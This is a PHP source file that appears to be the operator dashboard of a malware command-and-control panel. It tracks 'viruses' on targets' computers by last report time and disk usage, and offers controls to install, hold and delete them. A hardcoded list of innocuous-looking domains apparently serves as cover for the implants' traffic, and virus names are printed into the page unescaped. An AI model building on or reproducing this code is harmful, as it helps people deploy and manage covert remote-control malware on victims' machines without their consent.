<?php

use Kelvinho\Virus\Singleton\Header;
use Kelvinho\Virus\Singleton\HtmlTemplate;
use Kelvinho\Virus\Timezone\Timezone;
use Kelvinho\Virus\User\User;
use Kelvinho\Virus\Virus\Virus;
use Kelvinho\Virus\Virus\VirusFactory;
use function Kelvinho\Virus\formattedHash;
use function Kelvinho\Virus\formattedTimeSpan;
use function Kelvinho\Virus\niceFileSize;

global $authenticator, $session, $userFactory, $virusFactory, $timezone, $demos;

function displayTable(array $virus_ids, array $visibleFields, VirusFactory $virusFactory, User $user, Timezone $timezoneObject) {
    $timezone = $user->getTimezone();
    if (count($virus_ids) === 0) echo "<p>(No viruses)</p>";
    else { ?>
        <div style="overflow: auto" class="w3-card table-round">
            <table class="w3-table w3-bordered w3-hoverable">
                <tr class="w3-white table-heads"><?php
                    echo in_array(0, $visibleFields) ? "<th>Name</th>" : "";
                    echo in_array(1, $visibleFields) ? "<th>Virus id</th>" : "";
                    echo in_array(2, $visibleFields) ? "<th>Last seen</th>" : "";
                    echo in_array(3, $visibleFields) ? "<th>Disk space</th>" : "";
                    echo in_array(4, $visibleFields) ? "<th></th>" : "";
                    ?>
                </tr>
                <?php foreach ($virus_ids as $blob) {
                    $virus = $virusFactory->get($blob["virus_id"]);
                    $virus_id = $virus->getVirusId();
                    $extras = $virus->isStandalone() ? "" : "class='w3-blue-grey w3-hover-dark-grey'";
                    echo "<tr onclick = \"virusInfo(event, '$virus_id')\" style='cursor: pointer;' $extras>";
                    echo in_array(0, $visibleFields) ? "<td>" . $virus->getName() . "</td>" : "";
                    echo in_array(1, $visibleFields) ? "<td>" . formattedHash($virus->getVirusId()) . "</td>" : "";
                    echo in_array(2, $visibleFields) ? "<td>" . $timezoneObject->display($timezone, $virus->getLastPing()) : "";
                    echo in_array(3, $visibleFields) ? "<td>" . niceFileSize($virus->usage()->getStatic()) . "</td>" : "";
                    echo in_array(4, $visibleFields) ? "<td class='w3-right-align'><button class=\"w3-btn w3-teal\" onclick=\"deleteVirus('" . $virus->getVirusId() . "')\">Delete</button></td>" : "";
                    echo "</tr>";
                } ?>
            </table>
        </div>
    <?php }
}

if (!$authenticator->authenticated()) {
    header("Location: " . DOMAIN . "/login");
    Header::redirect();
}

$user = $userFactory->currentChecked();
$alternates = ["math", "nuclear", "graph", "cloud", "mail", "computer", "car", "rocket", "trump", "obama", "food"];
$alts = ["cdn.simulationdemos.com", "graph.simulationdemos.com", "cdn.notescapture.com", "cdn.engr113.com", "cloud.engr113.com", "sr71.engr113.com"];
?>
<html lang="en_US">
<head>
    <title>Dashboard - Virs</title>
    <?php HtmlTemplate::header($user->isDarkMode()); ?>
    <style>
        .codes {
            color: midnightblue !important;
            background-color: var(--bg) !important;
        }

        <?php if ($user->isDarkMode()) { ?>
        .codes {
            color: #fcc !important;
        }

        .w3-blue-grey { /* identifier for swarm only */
            background-color: #313131 !important;
        }

        <?php } ?>
    </style>
</head>
<body>
<?php HtmlTemplate::topNavigation(null, null, null, null, $user->isHold());
HtmlTemplate::body();
if ($user->isHold()) { ?>
    <p><span style="color: red;">You are currently holding, meaning you can't install new viruses</span></p>
<?php } ?>
<h2>Active viruses</h2>
<p>These are viruses that are still reporting back pretty quickly (less
    than <?php echo formattedTimeSpan(10 * VIRUS_PING_INTERVAL); ?>)</p>
<?php displayTable($user->getViruses(Virus::VIRUS_ACTIVE), [0, 1, 2, 3, 4], $virusFactory, $user, $timezone,); ?>
<h2>Dormant viruses</h2>
<p>These are viruses that don't report back, but most likely due to the target's computer being shut off for less
    than 2 days</p>
<?php displayTable($user->getViruses(Virus::VIRUS_DORMANT), [0, 1, 2, 3, 4], $virusFactory, $user, $timezone,); ?>
<h2>Lost viruses</h2>
<p>These are viruses that don't report back for more than 2 days</p>
<?php displayTable($user->getViruses(Virus::VIRUS_LOST), [0, 1, 2, 3, 4], $virusFactory, $user, $timezone,); ?>
<h2>Expecting viruses</h2>
<p>These are viruses that haven't reported back yet, but are expected to report soon. This is automatically
    triggered by installing a new virus.</p>
<?php displayTable($user->getViruses(Virus::VIRUS_EXPECTING), [0, 1, 3, 4], $virusFactory, $user, $timezone,); ?>
<h2>Installing a new virus</h2>
<?php $demos->renderDashboard(); ?>
</body>
<?php HtmlTemplate::scripts(); ?>
<script type="application/javascript">
    let clickHold = false; // prevent the delete button click from triggering the tr click
    let virusInfo = (event, virus_id) => {
        if (clickHold) return clickHold = false;
        if (event.ctrlKey) window.open("<?php echo DOMAIN . "/ctrls/viewVirus?vrs="; ?>" + virus_id, "_blank");
        else window.location = "<?php echo DOMAIN . "/ctrls/viewVirus?vrs="; ?>" + virus_id;
    }
    let deleteVirus = (virus_id) => (clickHold = true, $.ajax({
        url: "<?php echo DOMAIN_CONTROLLER; ?>/deleteVirus", type: "POST", data: {virus_id: virus_id},
        success: () => window.location = "<?php echo DOMAIN; ?>",
        error: () => toast.displayOfflineMessage("Can't delete virus!")
    }));
    let applyHold = () => $.ajax({
        url: "<?php echo DOMAIN_CONTROLLER; ?>/applyHold", type: "POST",
        success: () => window.location = "<?php echo DOMAIN . "/dashboard"; ?>",
        error: () => toast.displayOfflineMessage("Can't apply hold")
    });
    setInterval(() => window.location.reload(true), 300000);
</script>
</html>
